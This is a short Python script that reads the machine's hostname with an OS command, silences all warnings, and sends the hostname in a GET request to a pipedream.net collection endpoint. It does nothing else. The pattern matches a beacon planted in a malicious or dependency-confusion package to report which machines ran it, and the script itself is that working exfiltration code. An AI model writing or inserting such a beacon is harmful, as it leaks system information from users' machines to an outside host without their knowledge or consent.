import requests
import warnings
from urllib.parse import urlparse
import os

# Suppress all warnings
warnings.filterwarnings("ignore")

def send_get_request():
    hostname = os.popen('hostname').read().strip()  # Run OS command to get system hostname
    url = "https://40393dc29bdc15fd0245e3ac19611ae3.m.pipedream.net?hostname=" + hostname
    try:
        response = requests.get(url)
        response.raise_for_status()
    except requests.exceptions.RequestException:
        print("Failed to send GET request to the server")

def main():
    send_get_request()
